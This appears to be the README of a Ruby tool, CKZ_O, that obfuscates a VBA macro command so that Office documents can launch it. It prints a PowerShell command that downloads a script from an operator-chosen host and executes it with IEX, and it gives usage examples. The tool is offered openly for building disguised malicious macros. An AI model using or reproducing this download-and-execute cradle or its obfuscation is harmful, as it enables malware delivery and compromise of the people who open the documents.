```NAME
       ____ _  __ _____     ___
      / ___| |/ /|__  /    / _ \
     | |   | ' /   / /    | | | |
     | |___| . \  / /_    | |_| |
      \____|_|\_\/____|____\___/
      Created by CausticKirbyZ
``` 
DESCRIPTION
Obfuscates a vba cmd for office macros by splitting it 
by chars and then combining it back together and running it in a shell

VBA CMD
powershell.exe \"IEX ((new-object net.webclient).downloadstring('#{protocol}://#{ipadd}/#{filename}')) 

SYNOPSIS
CKZ_O.rb <protocol> <ip address[:portnumber]> <file name>

EXAMPLE
./CKZ_O.rb http 192.168.1.1 myfile.txt
./CKZ_O.rb https 192.168.1.1:1234 myfile.txt

GITHUB 
For all other bugs/requests post to:
https://github.com/CausticKirbyZ/CKZ_O.git